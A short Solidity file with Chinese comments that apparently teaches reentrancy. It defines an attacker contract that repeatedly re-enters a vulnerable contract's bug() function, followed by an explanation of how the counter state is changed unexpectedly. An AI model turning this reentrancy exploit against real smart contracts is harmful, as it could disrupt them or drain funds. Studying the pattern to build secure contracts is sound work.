// 攻擊者合約
contract Attacker {
    Vulnerable public vulnerableContract;
    uint public attackCount = 0;
    
    constructor(address _vulnerableAddress) {
        vulnerableContract = Vulnerable(_vulnerableAddress);
    }
    
    // 攻擊函式，呼叫有漏洞的合約
    function attack() public {
        vulnerableContract.bug(this);
    }
    
    // 當被呼叫時，會再次呼叫漏洞合約，造成遞迴調用
    function f() external {
        attackCount++;
        
        // 在此處重新進入漏洞合約，只要不超過 gas 限制，就可以持續呼叫
        if (attackCount < 5) {
            vulnerableContract.bug(this);
        }
    }
}

/*
攻擊說明：
此攻擊示範「不安全系統狀態變更」漏洞。攻擊者利用漏洞合約中的 bug() 函式在呼叫外部合約前先改變狀態，
但在外部呼叫完成前，該狀態就已可被讀取或使用。當攻擊者合約呼叫漏洞合約的 bug() 函式，並在被呼叫的 f() 
函式中重新進入 bug() 函式時，系統狀態（counter 變數）會在一系列操作完成前就被多次更新，導致合約的狀態
被非預期地改變。這種重入攻擊不一定直接竊取資金，但會使合約行為異常，可能造成拒絕服務或其他不預期的後果。
*/